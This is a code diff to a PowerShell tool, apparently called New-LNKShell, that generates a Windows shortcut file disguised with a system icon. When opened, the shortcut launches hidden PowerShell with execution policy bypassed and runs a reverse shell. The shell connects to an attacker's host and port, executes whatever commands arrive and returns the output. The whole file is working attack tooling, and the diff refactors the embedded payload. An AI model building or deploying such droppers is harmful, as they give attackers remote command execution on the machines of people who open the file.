@@ -20,7 +20,6 @@ PS> New-LNKShell -LHOST 192.168.1.1 -LPORT 4444
 #>
 
 [CmdletBinding()]
-
 Param (
     [ValidateRange(1,65535)]
     [int]
@@ -36,20 +35,15 @@ Param (
     $OutPath = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Filename)
 )
 
+$Command = @"
+`$Client = New-Object System.Net.Sockets.TCPClient('$LHOST', $LPORT);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();
+"@
+
+Write-Host "[*] Creating shortcut (${LHOST}:$LPORT)"
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($OutPath)
 $Shortcut.TargetPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe'
 $Shortcut.IconLocation = '%SystemRoot%\System32\Shell32.dll,21'
-$Shortcut.Arguments = '-WindowStyle Hidden /c $Client = New-Object System.Net.Sockets.TCPClient(' +
-                       $('"""' + $LHOST + '"""') + ',' + $LPORT + ');
-                       $Stream = $Client.GetStream();
-                       [byte[]]$Bytes = 0..255|%{0};
-                       while(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;
-                       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i);
-                       $SendBack = (iex $data 2>&1 | Out-String );
-                       $SendBack2  = $SendBack + """PS """ + (pwd).Path + """> """;
-                       $SendByte = ([text.encoding]::ASCII).GetBytes($SendBack2);
-                       $Stream.Write($SendByte,0,$SendByte.Length);
-                       $Stream.Flush()};
-                       $Client.Close()'
+$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Noprofile -Command $Command"
 $Shortcut.Save()
+Write-Host "[*] Shortcut created: $OutPath"
